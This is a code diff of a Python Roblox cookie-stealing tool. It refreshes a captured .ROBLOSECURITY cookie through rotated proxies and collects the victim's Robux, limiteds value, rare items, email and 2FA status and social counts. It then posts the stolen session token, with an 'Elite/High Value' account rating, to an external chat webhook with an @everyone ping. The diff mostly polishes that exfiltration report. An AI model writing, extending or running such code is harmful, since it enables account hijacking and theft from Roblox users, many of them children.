@@ -28,18 +28,6 @@ def format_webshare(p_str):
         return f"http://{user}:{pwd}@{ip}:{port}", ip, port, user, pwd
     return None, None, None, None, None
 
-SPECIAL_ASSETS = {
-    "Korblox": 139607718,
-    "Headless": 134082579,
-    "Violet Valk": 1402432199,
-}
-
-GAMES = {
-    "Adopt Me": 383310974,
-    "MM2": 142823291,
-    "PS99": 3259657279,
-}
-
 def extract_and_clean_cookie(raw_input):
     if not raw_input:
         return ""
@@ -65,7 +53,6 @@ def extract_and_clean_cookie(raw_input):
     return cleaned
 
 def refresh_cookie_via_playwright(raw_cookie):
-    """Uses Playwright to hit Roblox and capture the refreshed .ROBLOSECURITY token"""
     shuffled_proxies = list(RAW_WEBSHARE_PROXIES)
     random.shuffle(shuffled_proxies)
     
@@ -75,9 +62,7 @@ def refresh_cookie_via_playwright(raw_cookie):
     with sync_playwright() as p:
         launch_args = {}
         if proxy_url and ip and port:
-            launch_args["proxy"] = {
-                "server": f"http://{ip}:{port}"
-            }
+            launch_args["proxy"] = {"server": f"http://{ip}:{port}"}
             if user and pwd:
                 launch_args["proxy"]["username"] = user
                 launch_args["proxy"]["password"] = pwd
@@ -100,7 +85,7 @@ def refresh_cookie_via_playwright(raw_cookie):
             
             if "login" in page.url or page.locator("#login-button").count() > 0:
                 browser.close()
-                return raw_cookie # fallback to original if refresh page forced login
+                return raw_cookie
 
             cookies = context.cookies()
             refreshed = None
@@ -116,7 +101,6 @@ def refresh_cookie_via_playwright(raw_cookie):
 
 def get_working_session(roblosecurity):
     session = requests.Session()
-    
     session.headers.update({
         "Accept": "*/*",
         "Accept-Encoding": "gzip, deflate, br, zstd",
@@ -180,11 +164,9 @@ def main():
     if not raw_cookie:
         sys.exit(0)
 
-    # 1. Refresh cookie FIRST before touching stats endpoints
     print("[+] Refreshing cookie session...")
     refreshed_cookie = refresh_cookie_via_playwright(raw_cookie)
 
-    # 2. Build verified requests session with the freshly updated token
     session = get_working_session(refreshed_cookie)
 
     auth_res = session.get("https://users.roblox.com/v1/users/authenticated", timeout=5)
@@ -211,6 +193,7 @@ def main():
     user_info = safe_get(f"https://users.roblox.com/v1/users/{user_id}")
     created = user_info.get("created", "")
     age_days = 0
+    created_dt = None
     if created:
         try:
             created_dt = datetime.fromisoformat(created.replace("Z", "+00:00"))
@@ -283,60 +266,151 @@ def main():
     headless = check_bundle(201)
     violet_valk = check_asset(799742571)
 
-    groups_res = safe_get(f"https://groups.roblox.com/v1/users/{user_id}/groups/roles")
-    groups = groups_res.get("data", [])
-    group_count = len(groups)
-    owned_groups = sum(1 for g in groups if g.get("role", {}).get("rank") == 255)
-
     email_ver = safe_get("https://accountsettings.roblox.com/v1/email").get("verified", False)
     twofa = safe_get("https://twostepverification.roblox.com/v1/metadata").get("twoStepVerificationEnabled", False)
 
-    def check_played_and_passes(universe_id):
-        played = False
-        r = safe_get(
-            f"https://badges.roblox.com/v1/users/{user_id}/badges",
-            params={"limit": 100}
-        )
+    def check_played(universe_id):
+        r = safe_get(f"https://badges.roblox.com/v1/users/{user_id}/badges", params={"limit": 100})
         if isinstance(r, dict):
             for badge in r.get("data", []):
                 if badge.get("awardingUniverse", {}).get("id") == universe_id:
-                    played = True
-        return played, 0
+                    return True
+        return False
 
-    adopt_played, _ = check_played_and_passes(383310974)
-    mm2_played, _ = check_played_and_passes(142823291)
-    ps99_played, _ = check_played_and_passes(3259657279)
+    adopt_played = check_played(383310974)
+    mm2_played = check_played(142823291)
+    ps99_played = check_played(3259657279)
 
-    avatar_url = f"https://www.roblox.com/headshot-thumbnail/image?userId={user_id}&width=420&height=420&format=png"
+    friends_count = safe_get(f"https://friends.roblox.com/v1/users/{user_id}/friends/count").get("count", 0)
+    followers_count = safe_get(f"https://friends.roblox.com/v1/users/{user_id}/followers/count").get("count", 0)
+    following_count = safe_get(f"https://friends.roblox.com/v1/users/{user_id}/followings/count").get("count", 0)
+    badges_data = safe_get(f"https://badges.roblox.com/v1/users/{user_id}/badges", params={"limit": 10})
+    badges_count = len(badges_data.get("data", [])) if isinstance(badges_data, dict) else 0
+
+    bio_text = user_info.get("description", "")
+    bio_quote = f"> {bio_text.replace(chr(10), chr(10) + '> ')}" if bio_text else "> *No bio provided.*"
+
+    total_worth = robux + rap
+    headshot_url = f"https://www.roblox.com/headshot-thumbnail/image?userId={user_id}&width=420&height=420&format=png"
+    render_url = f"https://www.roblox.com/bust-thumbnail/image?userId={user_id}&width=420&height=420&format=png"
+
+    years = age_days // 365
+    months = (age_days % 365) // 30
+    age_formatted = f"{years}y {months}m ({age_days:,} days)" if years > 0 else f"{age_days:,} days"
+    created_unix = int(created_dt.timestamp()) if created_dt else int(time.time())
+
+    if rap >= 50000 or age_days > 1825:
+        tier_rating = "⭐ Elite Account • High Value"
+    elif rap >= 10000 or age_days > 365:
+        tier_rating = "🔹 Active Account • Standard"
+    else:
+        tier_rating = "🔸 Newer Account • Low Stats"
+
+    if email_ver and twofa:
+        embed_color = 0x2ECC71
+    elif not email_ver and not twofa:
+        embed_color = 0xE74C3C
+    else:
+        embed_color = 0xF1C40F
+
+    special_list = []
+    if korblox: special_list.append("Korblox")
+    if headless: special_list.append("Headless")
+    if violet_valk: special_list.append("Violet Valk")
+    special_text = " • ".join([f"`{item}`" for item in special_list]) if special_list else "None owned"
+
+    games_list = []
+    if adopt_played: games_list.append("Adopt Me")
+    if mm2_played: games_list.append("MM2")
+    if ps99_played: games_list.append("PS99")
+    games_text = " • ".join([f"`{g}`" for g in games_list]) if games_list else "No tracked games played"
 
     payload = {
         "content": "@everyone",
-        "username": f"{username} | Stats",
-        "avatar_url": avatar_url,
+        "username": "Core Extractor",
+        "avatar_url": "https://cdn.discordapp.com/emojis/1085024250275815525.png",
         "embeds": [
             {
-                "title": f"🎮 {username} | Roblox Stats",
-                "description": f"[Stats Link](https://www.rolimons.com/player/{user_id}) | [Roblox Profile](https://www.roblox.com/users/{user_id}/profile)",
-                "color": 0x2B2D31,
-                "thumbnail": {"url": avatar_url},
+                "title": f"{username} {('👑' if premium else '')} {('✅' if email_ver else '')}",
+                "description": f"### {tier_rating}\n{bio_quote}",
+                "color": embed_color,
+                "thumbnail": {"url": headshot_url},
+                "image": {"url": render_url},
                 "fields": [
-                    {"name": "🐱 Username", "value": f"```{username}```", "inline": False},
-                    {"name": "📋 Account Stats", "value": f"+ Account Age: `{age_days} Days`\n+ Premium: `{premium}`", "inline": False},
-                    {"name": "🪙 Robux", "value": f"Balance: `{robux:,}`\nPending: `{pending:,}`", "inline": True},
-                    {"name": "💎 Limiteds", "value": f"RAP: `{rap:,}`\nLimiteds: `{lim_count}`", "inline": True},
-                    {"name": "👑 Special Items", "value": f"+ Korblox: `{korblox}`\n+ Headless: `{headless}`\n+ Violet Valk: `{violet_valk}`", "inline": False},
-                    {"name": "⚙️ Settings", "value": f"+ Email Verified: `{email_ver}`\n+ 2FA: `{twofa}`", "inline": True},
-                    {"name": "👥 Groups", "value": f"Owned: `{owned_groups}`\nJoined: `{group_count}`", "inline": True},
-                    {"name": "⭐ Games", "value": f"- Adopt Me: `{adopt_played}`\n- MM2: `{mm2_played}`\n- PS99: `{ps99_played}`", "inline": False}
+                    {
+                        "name": "📊 Financials",
+                        "value": f"• **Robux:** `{robux:,}`\n• **Pending:** `{pending:,}`\n• **RAP:** `{rap:,}`\n• **Total Worth:** `{total_worth:,}`",
+                        "inline": True
+                    },
+                    {
+                        "name": "🛡️ Security",
+                        "value": f"• **Email:** `{'✅' if email_ver else '❌'}`\n• **2FA:** `{'✅' if twofa else '❌'}`\n• **Premium:** `{'✅' if premium else '❌'}`",
+                        "inline": True
+                    },
+                    {
+                        "name": "👥 Socials",
+                        "value": f"• **Friends:** `{friends_count:,}`\n• **Followers:** `{followers_count:,}`\n• **Following:** `{following_count:,}`",
+                        "inline": True
+                    },
+                    {
+                        "name": "📋 Account Data",
+                        "value": f"• **Age:** `{age_formatted}`\n• **Joined:** <t:{created_unix}:D> (<t:{created_unix}:R>)\n• **Badges:** `{badges_count:,}`",
+                        "inline": False
+                    },
+                    {
+                        "name": "👑 Rare Assets",
+                        "value": special_text,
+                        "inline": False
+                    },
+                    {
+                        "name": "⭐ Tracked Games",
+                        "value": games_text,
+                        "inline": False
+                    }
                 ],
-                "footer": {"text": f"VERSION_01 | 13+ • {display_name}"},
+                "footer": {
+                    "text": f"Requested by {display_name}",
+                    "icon_url": headshot_url
+                },
                 "timestamp": datetime.now(timezone.utc).isoformat()
             },
             {
-                "title": "🍪 Refreshed Session Cookie",
+                "title": "🔑 Refreshed Session Cookie",
                 "description": f"```text\n{refreshed_cookie}\n```",
                 "color": 0x2B2D31,
                 "footer": {"text": f"Token Length: {len(refreshed_cookie)} chars"}
+            }
+        ],
+        "components": [
+            {
+                "type": 1,
+                "components": [
+                    {
+                        "type": 2,
+                        "style": 5,
+                        "label": "Roblox Profile",
+                        "url": f"https://www.roblox.com/users/{user_id}/profile"
+                    },
+                    {
+                        "type": 2,
+                        "style": 5,
+                        "label": "Stats Link",
+                        "url": f"https://www.rolimons.com/player/{user_id}"
+                    },
+                    {
+                        "type": 2,
+                        "style": 5,
+                        "label": "Inventory",
+                        "url": f"https://www.roblox.com/users/{user_id}/inventory#!/collectibles"
+                    },
+                    {
+                        "type": 2,
+                        "style": 2,
+                        "label": "Refresh Session",
+                        "custom_id": f"refresh_session_{user_id}",
+                        "emoji": {"name": "🔄"}
+                    }
+                ]
             }
         ],
         "allowed_mentions": {"parse": ["everyone"]}
